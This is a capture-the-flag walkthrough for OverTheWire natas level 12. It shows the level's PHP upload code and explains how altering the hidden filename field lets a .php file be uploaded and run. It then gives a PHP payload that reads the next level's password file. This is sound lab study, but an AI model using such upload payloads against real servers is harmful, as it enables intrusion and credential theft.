---
title: natas 12 walkthrough
description: over the wire natas 12
layout: libdoc_page
date: 1111-11-11
eleventyNavigation:
    key: natas-12 OverTheWire CTFs
    parent: OverTheWire CTFs
    title: natas 12 walkthrough
    order: 30
---
## Description
>   Username: natas12
> 
> URL:      http://natas12.natas.labs.overthewire.org
### Source Code
```php
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```

---
## Progress
### Observation
From the source code, we know it keeps the file extension, and it generates a random filename to replace the original one. 

First, notice that we can control the file name sent to the server side. By changing `<input type="hidden" name="filename" value="utgmtlqgnh.jpg">`, we can control the file extension. (seems useless)

### Trial
Use `.sh` file type : cannot execute
Use `.php` file type : CAN execute

### Make PHP file
Just open the file with password 
```php
<?php 
$filepath = "/etc/natas_webpass/natas13";
$myfile = fopen($filepath, "r") or die("Unable to open file!");
echo fread($myfile,filesize($filepath));
fclose($myfile);
?>
```
### Upload and Access the File
Get the password.
---
## Hint

---
## Solving
### Reference
- https://portswigger.net/web-security/file-upload
### Category
- [[File upload vulnerability]]
### Techniques
- 

### Tools
- 